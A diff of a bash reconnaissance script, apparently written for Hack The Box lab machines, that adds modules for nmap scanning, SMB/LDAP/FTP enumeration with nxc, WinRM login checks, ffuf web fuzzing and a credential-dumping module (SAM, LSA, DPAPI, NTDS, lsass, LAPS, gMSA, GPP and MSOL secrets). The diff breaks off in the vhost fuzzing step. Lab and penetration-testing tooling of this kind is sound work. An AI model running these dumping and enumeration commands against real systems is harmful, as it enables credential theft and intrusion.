@@ -1,37 +1,74 @@
 #!/bin/bash
 
 DIM='\033[2m'
-P2='\033[38;5;99m'
+PURPLE='\033[38;5;99m'
 GRAY='\033[38;5;245m'
 YELLOW='\033[38;5;221m'
 RED='\033[38;5;203m'
 BLUE='\033[38;5;75m'
 RESET='\033[0m'
 
-log() { echo -e "$*" | tee -a "$LOGFILE"; }
+#------------------------------------------------
+
+LOGFILE="${LOGFILE:-/dev/null}"
+
+log() {
+  local line
+  line=$(echo -e "$*")
+  printf '%s\n' "$line"
+  printf '%s\n' "$line" | sed -r 's/\x1B\[[0-9;]*[mK]//g' >>"$LOGFILE"
+}
 info() { log " ${GRAY}$*${RESET}"; }
 warn() { log " ${YELLOW}$*${RESET}"; }
-err() { echo -e " ${RED}$*${RESET}"; }
+err() {
+  local line
+  line=$(echo -e " ${RED}$*${RESET}")
+  printf '%s\n' "$line" >&2
+  printf '%s\n' "$line" | sed -r 's/\x1B\[[0-9;]*[mK]//g' >>"$LOGFILE"
+}
 ask() { echo -ne " $* "; }
+show() { log "${GRAY}$*${RESET}"; }
+
+run() {
+  FORCE_COLOR=1 "$@" 2>&1 | tee >(sed -r 's/\x1B\[[0-9;]*[mK]//g' >>"$LOGFILE")
+}
+
+cmdline() {
+  local IFS=' '
+  printf '%s\n' "$*"
+}
+
+require_tool() {
+  local tool="$1"
+  if ! command -v "$tool" &>/dev/null; then
+    warn "$tool not found - skipping"
+    return 1
+  fi
+  return 0
+}
 
 section() {
+  local cols
+  cols=$(tput cols 2>/dev/null || echo 80)
   local line
-  printf -v line '%54s' ''
+  printf -v line "%${cols}s" ''
   line="${line// /─}"
   log ""
-  log "${P2} $*${RESET}"
-  log "${P2}${line}${RESET}"
+  log "${PURPLE} $*${RESET}"
+  log "${PURPLE}${line}${RESET}"
 }
 subsection() {
+  local cols
+  cols=$(tput cols 2>/dev/null || echo 80)
+  cols=$((cols / 2))
   local line
-  printf -v line '%40s' ''
+  printf -v line "%${cols}s" ''
   line="${line// /─}"
   log ""
   log " ${BLUE}$*${RESET}"
   log " ${BLUE}${line}${RESET}"
 }
 
-#/etc/hosts helper
 add_host() {
   local host="$1"
   [[ -z "$host" ]] && return
@@ -40,58 +77,91 @@ add_host() {
     local current_ip
     current_ip=$(grep -w "$host" /etc/hosts | awk '{print $1}' | head -1)
 
-    if [[ "$current_ip" == "$TARGET" ]]; then
-      info "$host already in /etc/hosts with correct IP ($TARGET) - skipping"
+    if [[ "$current_ip" == "$IP" ]]; then
+      info "$host already in /etc/hosts with correct IP ($IP) - skipping"
     else
-      warn "$host is mapped to $current_ip, but current target is $TARGET"
-      ask "replace '$current_ip $host' with '$TARGET $host'? [Y/n]"
+      warn "$host is mapped to $current_ip, but current IP is $IP"
+      ask "replace '$current_ip $host' with '$IP $host'? [Y/n]"
       read -r confirm
       if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
-        sudo sed -i "s/^[[:space:]]*${current_ip}[[:space:]].*${host}.*/${TARGET}\t${host}/" /etc/hosts
-        info "updated $TARGET $host"
+        sudo sed -i "s/^[[:space:]]*${current_ip}[[:space:]].*${host}.*/${IP}\t${host}/" /etc/hosts
+        info "updated $IP $host"
       else
         info "kept existing entry: $current_ip $host"
       fi
     fi
 
-  elif grep -qP "^\s*${TARGET}\s" /etc/hosts 2>/dev/null; then
-    ask "append '$host' to existing $TARGET line? [Y/n]"
+  elif grep -qP "^\s*${IP}\s" /etc/hosts 2>/dev/null; then
+    ask "append '$host' to existing $IP line? [Y/n]"
     read -r confirm
     if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
-      sudo sed -i "/^\s*${TARGET}\s/s/$/ ${host}/" /etc/hosts
+      sudo sed -i "/^\s*${IP}\s/s/$/ ${host}/" /etc/hosts
       info "appended → $host"
     fi
 
   else
-    ask "add '$TARGET $host' to /etc/hosts? [Y/n]"
+    ask "add '$IP $host' to /etc/hosts? [Y/n]"
     read -r confirm
     if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
-      printf '%s\t%s\n' "$TARGET" "$host" | sudo tee -a /etc/hosts >/dev/null
-      info "added → $TARGET $host"
+      printf '%s\t%s\n' "$IP" "$host" | sudo tee -a /etc/hosts >/dev/null
+      info "added → $IP $host"
     fi
   fi
 }
 
-# Argument parsing ------------------------------
-TARGET=""
+resolve_domain() {
+  local raw="$1"
+  if [[ "$raw" == *.* ]]; then
+    echo "$raw"
+  else
+    echo "${raw}.htb"
+  fi
+}
+
+usage() {
+  echo "usage: $0 <IP> [options]"
+  echo
+  echo "  IP                  target IP address"
+  echo "  -n <name>           hostname for /etc/hosts (default .htb)"
+  echo "  -m <modules>        comma-separated list of modules"
+  echo "                      available modules: nmap,smb,ldap,ftp,creds,roasting,web,winrm"
+  echo "  -u <user>           username"
+  echo "  -p <pass>           password"
+  echo "  -f                  full port scan (-p-) instead of top 1000"
+  echo "  -h                  show this help"
+  echo
+  echo "examples:"
+  echo
+  echo "basic scan: $0 10.10.11.100 -n mybox"
+  echo "authenticated scan: $0 10.10.11.100 -n mybox -u admin -p 'P@ss1'"
+  echo "specific modules scan: $0 10.10.11.100 -n mybox -u admin -p 'P@ss1' -m smb,web"
+  exit 1
+}
+
+# Argument parsing ------------------------------------------------------------------
+IP=""
 NAME=""
 USER_ARG=""
 PASS_ARG=""
-
-usage() {
-  echo -e "${RED}usage: $0 <IP> [-n name] [-u user] [-p password]${RESET}"
-  echo -e "${GRAY}Example: $0 10.10.11.100 -n mybox -u admin -p 'P@ss1'${RESET}"
-  exit 1
-}
+MODULES_ARG=""
+FULL_SCAN=""
 
 if [[ $# -lt 1 || "$1" == -* ]]; then
   usage
 fi
-TARGET="$1"
+
+IP="$1"
 shift
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
+  -h | --help)
+    usage
+    ;;
+  -f)
+    FULL_SCAN=1
+    shift
+    ;;
   -n)
     NAME="$2"
     shift 2
@@ -104,6 +174,10 @@ while [[ $# -gt 0 ]]; do
     PASS_ARG="$2"
     shift 2
     ;;
+  -m)
+    MODULES_ARG="$2"
+    shift 2
+    ;;
   *)
     err "unknown argument: $1"
     usage
@@ -111,291 +185,434 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-if ! [[ "$TARGET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-  err "invalid IP: $TARGET"
+if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+  err "invalid IP: $IP"
   exit 1
 fi
 
-resolve_domain() {
-  local raw="$1"
-  if [[ "$raw" == *.* ]]; then
-    echo "$raw"
-  else
-    echo "${raw}.htb"
-  fi
-}
+MODULES=(nmap smb ldap ftp creds roasting web winrm)
+SELECTED=""
+if [[ -n "$MODULES_ARG" ]]; then
+  for m in ${MODULES_ARG//,/ }; do
+    [[ " ${MODULES[*]} " == *" $m "* ]] || {
+      err "unknown module: $m (available: ${MODULES[*]})"
+      usage
+    }
+    SELECTED="$SELECTED $m"
+  done
+  SELECTED="${SELECTED# }"
+else
+  SELECTED="${MODULES[*]}"
+fi
 
 DOMAIN=""
 if [[ -n "$NAME" ]]; then
   DOMAIN=$(resolve_domain "$NAME")
 fi
 
-LOGFILE="recon_${TARGET}.log"
-: >"$LOGFILE"
+LOGFILE="recon_${IP}.log"
+NMAP_FILE="nmap_${IP}.txt"
 
-for t in nmap ffuf; do
-  if ! command -v "$t" &>/dev/null; then
-    err "$t not found. Aborting."
-    exit 1
+# nmap ----------------------------------------------------------------------------
+
+mod_nmap() {
+  require_tool nmap || return
+
+  # full scan always wins - don't overwrite it with a fast one
+  if [[ -z "$FULL_SCAN" && -f "$NMAP_FILE" ]] && grep -q '^# scan: full' "$NMAP_FILE" 2>/dev/null; then
+    section "port scan"
+    info "full scan already in $NMAP_FILE - reusing, skipping nmap"
+    NMAP_OUTPUT="$(cat "$NMAP_FILE")"
+    return
   fi
-done
 
-# Port scan ------------------------------
-section "port scan"
-
-(ping -c 2 -W 2 "$TARGET" &>/dev/null || nmap -sn "$TARGET" 2>/dev/null | grep -q "Host is up") &
-HOST_CHECK_PID=$!
-nmap -sC -sV --top-ports 1000 --open "$TARGET" 2>&1 | tee -a "$LOGFILE"
-wait "$HOST_CHECK_PID" || {
-  err "host $TARGET appears to be down or unreachable. Aborting."
-  exit 1
+  : >"$LOGFILE"
+  section "port scan"
+  local SCAN_FLAGS=(-sC -sV --open)
+  if [[ -n "$FULL_SCAN" ]]; then
+    SCAN_FLAGS+=(-p- -T4)
+  else
+    SCAN_FLAGS+=(--top-ports 1000)
+  fi
+  show nmap "${SCAN_FLAGS[@]}" "$IP"
+  NMAP_OUTPUT=$(nmap "${SCAN_FLAGS[@]}" "$IP" 2>&1)
+  {
+    printf '# scan: %s\n' "${FULL_SCAN:-top1000}"
+    printf '# host: %s\n' "$IP"
+    printf '%s\n' "$NMAP_OUTPUT"
+  } >"$NMAP_FILE"
+  log "$NMAP_OUTPUT"
+  info "scan saved to $NMAP_FILE"
 }
-OPEN_PORTS=$(grep -E '^[0-9]+/tcp.*open' "$LOGFILE" | awk -F/ '{print $1}' | tr '\n' ' ')
 
-# /etc/hosts ------------------------------
+# Parse ports from nmap output into arrays
+parse_ports() {
+  # Define ports that shouldn't be treated as web services even if they show HTTP
+  local WEB_BLOCKLIST="53 88 135 139 389 445 464 593 636 3268 3269 5985 5986 47001 49680"
+
+  # Extract potential web ports and filter out blacklisted ones
+  # (exclude RPC/WinRM-over-HTTP services like ncacn_http, http-rpc-epmap, http-wsman)
+  local RAW_WEB_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^[0-9]+/tcp.*open' | awk '$3 ~ /https?/ && $3 !~ /ncacn|rpc|wsman/' | awk -F/ '{print $1}' | sort -u))
+
+  WEB_PORTS=()
+  for port in "${RAW_WEB_PORTS[@]}"; do
+    if ! echo "$WEB_BLOCKLIST" | grep -qw "$port"; then
+      WEB_PORTS+=("$port")
+    fi
+  done
+
+  SMB_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^(139|445)/tcp.*open' | awk -F/ '{print $1}' | sort -u))
+  LDAP_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^(389|636|3268|3269)/tcp.*open' | awk -F/ '{print $1}' | sort -u))
+  FTP_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^21/tcp.*open' | awk -F/ '{print $1}' | sort -u))
+  WINRM_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^(5985|5986)/tcp.*open' | awk -F/ '{print $1}' | sort -u))
+}
+
+# nmap / port source --------------------------------------------------------------------
+if [[ " $SELECTED " != *" nmap "* ]]; then
+  if [[ -f "$NMAP_FILE" ]]; then
+    section "port scan"
+    info "existing scan found in $NMAP_FILE - reusing ports, skipping nmap"
+  elif [[ -s "$LOGFILE" ]]; then
+    section "port scan"
+    info "existing scan found in $LOGFILE - reusing ports, skipping nmap"
+  else
+    warn "no existing scan and nmap not selected - forcing nmap module"
+    SELECTED="$SELECTED nmap"
+  fi
+fi
+
+[[ " $SELECTED " == *" nmap "* ]] && mod_nmap
+
+if [[ -z "$NMAP_OUTPUT" ]]; then
+  if [[ -f "$NMAP_FILE" ]]; then
+    NMAP_OUTPUT="$(cat "$NMAP_FILE")"
+  else
+    NMAP_OUTPUT="$(cat "$LOGFILE")"
+  fi
+fi
+parse_ports
+
+info "debug ports -> web: ${WEB_PORTS[*]:-none} | smb: ${SMB_PORTS[*]:-none} | ldap: ${LDAP_PORTS[*]:-none} | ftp: ${FTP_PORTS[*]:-none} | winrm: ${WINRM_PORTS[*]:-none}"
+
+# /etc/hosts -----------------------------------------------------------------------
 section "/etc/hosts"
 
-EXISTING_HOST=$(awk -v ip="$TARGET" '$1==ip {for(i=2;i<=NF;i++) print $i; exit}' /etc/hosts 2>/dev/null)
-
-if [[ -n "$EXISTING_HOST" ]]; then
-  DOMAIN="$EXISTING_HOST"
-  info "found existing /etc/hosts entry for $TARGET -'$DOMAIN' - skipping"
-else
-  if [[ -z "$DOMAIN" ]]; then
+if [[ -z "$DOMAIN" ]]; then
+  EXISTING_HOST=$(awk -v ip="$IP" '$1==ip {print $2; exit}' /etc/hosts 2>/dev/null)
+  if [[ -n "$EXISTING_HOST" ]]; then
+    DOMAIN="$EXISTING_HOST"
+    info "found existing /etc/hosts entry for $IP - '$DOMAIN'"
+  else
     ask "no name given (-n) - enter a name for /etc/hosts (blank to skip):"
     read -r ENTERED_NAME
-    if [[ -n "$ENTERED_NAME" ]]; then
-      DOMAIN=$(resolve_domain "$ENTERED_NAME")
-    else
-      info "no name entered - skipping /etc/hosts"
-    fi
+    [[ -n "$ENTERED_NAME" ]] && DOMAIN=$(resolve_domain "$ENTERED_NAME")
   fi
-
-  [[ -n "$DOMAIN" ]] && add_host "$DOMAIN"
 fi
 
-# Service enumeration ------------------------------
-section "service enumeration"
+[[ -n "$DOMAIN" ]] && add_host "$DOMAIN"
 
-if echo "$OPEN_PORTS" | grep -qwE "445|139"; then
-  subsection "SMB"
+# smb module -----------------------------------------------------------------------
 
-  if command -v enum4linux-ng &>/dev/null; then
-    ENUM_CREDS=""
-    [[ -n "$USER_ARG" ]] && ENUM_CREDS="-u $USER_ARG"
-    [[ -n "$PASS_ARG" ]] && ENUM_CREDS="$ENUM_CREDS -p $PASS_ARG"
-    enum4linux-ng -A $ENUM_CREDS "$TARGET" 2>&1 | tee -a "$LOGFILE"
+mod_smb() {
+  section 'SMB Recon'
+  require_tool nxc || return
 
-    VULN_OUT=$(nmap -p 445 --script "smb-vuln*" "$TARGET" 2>>"$LOGFILE" || true)
-    echo "$VULN_OUT" >>"$LOGFILE"
-    VULNS=$(echo "$VULN_OUT" | grep -i "VULNERABLE" | sed 's/.*|//' | tr '\n' ' ' || true)
-    [[ -n "$VULNS" ]] && warn "VULNERABLE: $VULNS"
-  else
-    warn "enum4linux-ng not found - skipping"
-  fi
+  [[ ${#SMB_PORTS[@]} -eq 0 ]] && {
+    warn "no SMB ports found - skipping nxc"
+    return
+  }
 
-else
-  subsection "SMB"
-  info "not detected"
-fi
+  info "ports: ${SMB_PORTS[*]}"
 
-if echo "$OPEN_PORTS" | grep -qwE "389|636"; then
-  subsection "LDAP"
+  SMB_TARGET="${DOMAIN:-$IP}"
 
-  LDAP_OUT=$(nmap -p 389 --script ldap-rootdse "$TARGET" 2>>"$LOGFILE" || true)
-  echo "$LDAP_OUT" >>"$LOGFILE"
-  LDAP_DN=$(echo "$LDAP_OUT" | grep -oP 'defaultNamingContext: \K.*' | head -1 || true)
-  [[ -n "$LDAP_DN" ]] && info "DN: $LDAP_DN"
-
-  LDAP_FQDN=$(echo "$LDAP_OUT" | grep -oP 'dnsHostName: \K.*' | head -1 || true)
-  LDAP_DOMAIN=$(echo "$LDAP_DN" | sed 's/DC=//g; s/,/./g' | tr '[:upper:]' '[:lower:]' || true)
-
-  if [[ -n "$LDAP_FQDN" || -n "$LDAP_DOMAIN" ]]; then
-    subsection "/etc/hosts - ldap discovered"
-    [[ -n "$LDAP_DOMAIN" && "$LDAP_DOMAIN" != "$DOMAIN" ]] && add_host "$LDAP_DOMAIN"
-    [[ -n "$LDAP_FQDN" && "$LDAP_FQDN" != "$DOMAIN" ]] && add_host "$LDAP_FQDN"
-  fi
-
-  if command -v ldapsearch &>/dev/null; then
-    subsection "ldap - anonymous enumeration"
-
-    info "naming contexts:"
-    ldapsearch -x -H "ldap://${TARGET}" -s base namingContexts 2>>"$LOGFILE" |
-      grep -v "^#\|^$\|^search\|^result\|^dn:" |
-      tee -a "$LOGFILE"
-
-    if [[ -n "$LDAP_DN" ]]; then
-      info "users (sAMAccountName, cn, description):"
-      ldapsearch -x -H "ldap://${TARGET}" -b "$LDAP_DN" \
-        "(objectClass=person)" sAMAccountName cn description \
-        2>>"$LOGFILE" |
-        grep -v "^#\|^$\|^search\|^result\|^version" |
-        tee -a "$LOGFILE"
-
-      info "groups:"
-      ldapsearch -x -H "ldap://${TARGET}" -b "$LDAP_DN" \
-        "(objectClass=group)" cn member \
-        2>>"$LOGFILE" |
-        grep -v "^#\|^$\|^search\|^result\|^version" |
-        tee -a "$LOGFILE"
-
-      info "password policy:"
-      ldapsearch -x -H "ldap://${TARGET}" -b "$LDAP_DN" \
-        "(objectClass=domainDNS)" minPwdLength pwdHistoryLength lockoutThreshold \
-        2>>"$LOGFILE" |
-        grep -v "^#\|^$\|^search\|^result\|^version" |
-        tee -a "$LOGFILE"
-    fi
-  else
-    warn "ldapsearch not found - skipping anonymous enumeration"
-  fi
+  NXC_ARGS=(nxc smb "$SMB_TARGET")
 
   if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
-    if command -v ldapdomaindump &>/dev/null; then
-      subsection "ldap - full dump (ldapdomaindump)"
-      DUMP_DIR="ldap_dump_${TARGET}"
-      mkdir -p "$DUMP_DIR"
+    NXC_ARGS+=(-u "$USER_ARG" -p "$PASS_ARG")
+    NXC_ARGS+=(--local-groups --loggedon-users --rid-brute --users --shares --pass-pol)
+  elif [[ -n "$USER_ARG" ]]; then
+    warn "username provided but no password - enumeration flags require both"
+    NXC_ARGS+=(-u "$USER_ARG")
+  else
+    info "no credentials provided - gathering banner only"
+  fi
 
-      AUTH_URL="ldap://${TARGET}"
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+}
 
-      if [[ -n "$DOMAIN" ]]; then
-        NETBIOS_DOMAIN=$(echo "$DOMAIN" | cut -d. -f1 | tr '[:lower:]' '[:upper:]')
-        BIND_DN="${NETBIOS_DOMAIN}\\${USER_ARG}"
+# ldap module -----------------------------------------------------------------------
+
+mod_ldap() {
+  section 'LDAP Recon'
+  require_tool nxc || return
+
+  [[ ${#LDAP_PORTS[@]} -eq 0 ]] && {
+    warn "no LDAP ports found - skipping nxc"
+    return
+  }
+
+  info "ports: ${LDAP_PORTS[*]}"
+
+  LDAP_TARGET="${DOMAIN:-$IP}"
+
+  NXC_ARGS=(nxc ldap "$LDAP_TARGET")
+
+  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
+    NXC_ARGS+=(-u "$USER_ARG" -p "$PASS_ARG")
+    NXC_ARGS+=(--trusted-for-delegation --password-not-required --admin-count --users --groups)
+  elif [[ -n "$USER_ARG" ]]; then
+    warn "username provided but no password - enumeration flags require both"
+    NXC_ARGS+=(-u "$USER_ARG")
+  else
+    info "no credentials provided - gathering banner only"
+  fi
+
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+}
+
+# ftp module -----------------------------------------------------------------------
+
+mod_ftp() {
+  section 'FTP Recon'
+  require_tool nxc || return
+
+  [[ ${#FTP_PORTS[@]} -eq 0 ]] && {
+    warn "no FTP ports found - skipping nxc"
+    return
+  }
+
+  info "ports: ${FTP_PORTS[*]}"
+
+  FTP_TARGET="${DOMAIN:-$IP}"
+
+  NXC_ARGS=(nxc ftp "$FTP_TARGET")
+
+  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
+    NXC_ARGS+=(-u "$USER_ARG" -p "$PASS_ARG")
+  elif [[ -n "$USER_ARG" ]]; then
+    warn "username provided but no password - some modules may require both"
+    NXC_ARGS+=(-u "$USER_ARG")
+  else
+    info "no credentials provided - attempting anonymous login"
+  fi
+
+  NXC_ARGS+=(--ls)
+
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+}
+
+# winrm module -----------------------------------------------------------------------
+
+mod_winrm() {
+  section 'WinRM Recon'
+
+  if [[ ${#WINRM_PORTS[@]} -eq 0 ]]; then
+    info "not detected"
+    return
+  fi
+
+  info "ports: ${WINRM_PORTS[*]}"
+
+  WINRM_TARGET="${DOMAIN:-$IP}"
+
+  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
+    if require_tool evil-winrm; then
+      EW_ARGS=(timeout 10 evil-winrm -i "$WINRM_TARGET" -u "$USER_ARG" -p "$PASS_ARG" -c whoami)
+      show "$(cmdline "${EW_ARGS[@]}")"
+      EW_OUTPUT=$("${EW_ARGS[@]}" 2>&1)
+      if [[ -n "$EW_OUTPUT" ]]; then
+        log "$EW_OUTPUT"
       else
-        BIND_DN="${USER_ARG}"
-      fi
-
-      ldapdomaindump \
-        -u "$BIND_DN" \
-        -p "$PASS_ARG" \
-        --no-json --no-grep \
-        -o "$DUMP_DIR" \
-        "$AUTH_URL" \
-        2>&1 | tee -a "$LOGFILE"
-
-      if [[ -f "${DUMP_DIR}/domain_users.html" ]]; then
-        info "dump saved to: $DUMP_DIR/"
-        info "open ${DUMP_DIR}/domain_users.html in a browser for full output"
-      fi
-
-      if [[ -f "${DUMP_DIR}/domain_users_by_group.grep" ]]; then
-        subsection "ldap — users with descriptions"
-        grep -v "^#" "${DUMP_DIR}/domain_users_by_group.grep" |
-          awk -F'\t' '$10 != "" {print $3, "|", $10}' |
-          tee -a "$LOGFILE" || true
-      fi
-
-    else
-      warn "ldapdomaindump not found - install with: pip install ldapdomaindump"
-      warn "falling back to authenticated ldapsearch"
-
-      if command -v ldapsearch &>/dev/null && [[ -n "$LDAP_DN" ]]; then
-        BIND_DN="${USER_ARG}@${DOMAIN:-$TARGET}"
-        subsection "ldap — authenticated ldapsearch"
-        ldapsearch -x -H "ldap://${TARGET}" \
-          -D "$BIND_DN" -w "$PASS_ARG" \
-          -b "$LDAP_DN" \
-          "(objectClass=person)" sAMAccountName cn memberOf description pwdLastSet \
-          2>>"$LOGFILE" |
-          grep -v "^#\|^$\|^search\|^result\|^version" |
-          tee -a "$LOGFILE"
+        warn "connection failed - no output (wrong creds or WinRM not responding)"
       fi
     fi
-  fi
-else
-  subsection "LDAP"
-  info "not detected"
-fi
-
-if echo "$OPEN_PORTS" | grep -qwE "5985|5986"; then
-  subsection "WinRM"
-  if [[ -n "$USER_ARG" ]]; then
-    warn "WinRM detected, try:"
-    warn "evil-winrm -i $TARGET -u '$USER_ARG' -p '$PASS_ARG'"
+  elif [[ -n "$USER_ARG" ]]; then
+    warn "WinRM detected but password required"
+    warn "evil-winrm -i $WINRM_TARGET -u '$USER_ARG' -p <password>"
   else
-    warn "try evil-winrm after creds"
+    warn "WinRM detected - try evil-winrm after obtaining credentials"
   fi
-else
-  subsection "WinRM"
-  info "not detected"
-fi
+}
 
-# Web recon ------------------------------
-section 'Web Recon'
-WEB_BLOCKLIST="593 5985 5986 47001"
+# creds module -----------------------------------------------------------------------
 
-RAW_WEB=$(grep -E '^[0-9]+/tcp.*open' "$LOGFILE" |
-  awk '$3 ~ /https?/' |
-  awk -F/ '{print $1}' | tr '\n' ' ')
-WEB_PORTS=""
+mod_creds() {
+  section 'Credential Dumping'
+  require_tool nxc || return
 
-declare -A _SEEN
-for _P in $RAW_WEB; do
-  _S="http"
-  [[ "$_P" == "443" ]] && _S="https"
-
-  if echo "$WEB_BLOCKLIST" | grep -qw "$_P"; then
-    info "skipping port $_P (blocklisted — not a web app)"
-    continue
+  if [[ -z "$USER_ARG" || -z "$PASS_ARG" ]]; then
+    warn "credentials required for dumping - use -u and -p flags"
+    return
   fi
 
-  [[ -n "${_SEEN[$_S]:-}" ]] && continue
-  [[ "$_P" == "80" ]] && echo "$RAW_WEB" | grep -qw "443" && continue
-  _SEEN[$_S]=1
-  WEB_PORTS="$WEB_PORTS $_P"
-done
+  CREDS_TARGET="${DOMAIN:-$IP}"
+  CREDS_AUTH=(-u "$USER_ARG" -p "$PASS_ARG")
 
-WEB_PORTS="${WEB_PORTS# }"
+  # SAM + LSA + DPAPI
+  subsection "Secrets Dump (SAM + LSA + DPAPI)"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" --sam --lsa --dpapi)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
 
-if [[ -n "$WEB_PORTS" ]]; then
-  info "ports: $WEB_PORTS"
+  # NTDS
+  subsection "NTDS Dump"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" --ntds)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # ntdsutil
+  subsection "NTDS Util"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M ntdsutil)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # lsassy
+  subsection "lsassy (lsass dump)"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M lsassy)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # LAPS
+  subsection "LAPS (Local Admin Passwords)"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" --laps)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # gMSA
+  subsection "gMSA (Group Managed Service Accounts)"
+  NXC_ARGS=(nxc ldap "$CREDS_TARGET" "${CREDS_AUTH[@]}" --gmsa)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # Group Policy Preferences
+  subsection "Group Policy Preferences"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M gpp_password)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # MSOL
+  subsection "MSOL Account Password"
+  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M msol)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+}
+
+# web module -----------------------------------------------------------------------
+
+mod_web() {
+  section 'Web Recon'
+  require_tool ffuf || return
+
+  [[ ${#WEB_PORTS[@]} -eq 0 ]] && {
+    warn "no web ports found - skipping ffuf"
+    return
+  }
+
+  info "ports: ${WEB_PORTS[*]}"
+
   DIR_WL="/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt"
   DNS_WL="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
   [[ ! -f "$DIR_WL" ]] && DIR_WL="/usr/share/wordlists/dirb/common.txt"
   [[ ! -f "$DNS_WL" ]] && DNS_WL="/usr/share/wordlists/dirb/common.txt"
 
-  WEB_TARGET="${DOMAIN:-$TARGET}"
+  WEB_IP="${DOMAIN:-$IP}"
 
-  for PORT in $WEB_PORTS; do
+  for PORT in "${WEB_PORTS[@]}"; do
     SCHEME="http"
     [[ "$PORT" == "443" ]] && SCHEME="https"
     if [[ "$PORT" == "80" || "$PORT" == "443" ]]; then
-      BASE_URL="${SCHEME}://${WEB_TARGET}"
+      BASE_URL="${SCHEME}://${WEB_IP}"
     else
-      BASE_URL="${SCHEME}://${WEB_TARGET}:${PORT}"
+      BASE_URL="${SCHEME}://${WEB_IP}:${PORT}"
     fi
 
     INSECURE=""
     [[ "$SCHEME" == "https" ]] && INSECURE="-k"
 
-    BS=$(curl -s -o /dev/null -w "%{size_download}" "${BASE_URL}/nonexistent8675309" $INSECURE 2>/dev/null || echo 0)
-    BW=$(curl -s "${BASE_URL}/nonexistent8675309" $INSECURE 2>/dev/null | wc -w | tr -d ' ' || echo 0)
-
-    subsection "directories — ${BASE_URL}"
-    info "baseline — size:${BS} words:${BW}"
+    subsection "Directories - ${BASE_URL}"
     info "Use Ctrl + C to skip"
-    ffuf -u "${BASE_URL}/FUZZ" -w "$DIR_WL" \
-      -t 80 -fc 404,403 -fs "$BS" -fw "$BW" \
-      $INSECURE -noninteractive 2>>"$LOGFILE" | tee -a "$LOGFILE"
+    FFUF_ARGS=(ffuf -s -u "${BASE_URL}/FUZZ" -w "$DIR_WL" -t 80 -fc 404,403 -ac -noninteractive)
+    [[ -n "$INSECURE" ]] && FFUF_ARGS+=(-k)
+    show "$(cmdline "${FFUF_ARGS[@]}")"
+    run "${FFUF_ARGS[@]}"
 
     if [[ -n "$DOMAIN" ]]; then
-      subsection "subdomains - ${DOMAIN}"
-      SB=$(curl -s -o /dev/null -w "%{size_download}" "${SCHEME}://nonexistent8675309.${DOMAIN}" $INSECURE 2>/dev/null || echo 0)
-      ffuf -u "${SCHEME}://FUZZ.${DOMAIN}" -w "$DNS_WL" \
-        -t 20 -timeout 5 -fc 404,400 -fs "$SB" -fr \
-        $INSECURE -noninteractive 2>>"$LOGFILE" | tee -a "$LOGFILE"
+      subsection "Subdomains - ${DOMAIN}"
+      FFUF_ARGS=(ffuf -s -u "${SCHEME}://FUZZ.${DOMAIN}" -w "$DNS_WL" -t 20 -timeout 5 -fc 404,400 -ac -noninteractive)
+      [[ -n "$INSECURE" ]] && FFUF_ARGS+=(-k)
+      show "$(cmdline "${FFUF_ARGS[@]}")"
+      run "${FFUF_ARGS[@]}"
 
-      subsection "vhosts - ${DOMAIN}"
-      VB=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: nonexistent8675309.${DOMAIN}" "${SCHEME}://${TARGET}" $INSECURE 2>/dev/null || echo 0)
-      VW=$(curl -s -H "Host: nonexistent8675309.${DOMAIN}" "${SCHEME}://${TARGET}" $INSECURE 2>/dev/null | wc -w | tr -d ' ' || echo 0)
-      ffuf -u "${SCHEME}://${TARGET}" -H "Host: FUZZ.${DOMAIN}" -w "$DNS_WL" \
-        -t 15 -timeout 5 -fc 404,400 -fs "$VB" -fw "$VW" -fr \
-        $INSECURE -noninteractive 2>>"$LOGFILE" | tee -a "$LOGFILE"
+      subsection "Vhosts - ${DOMAIN}"
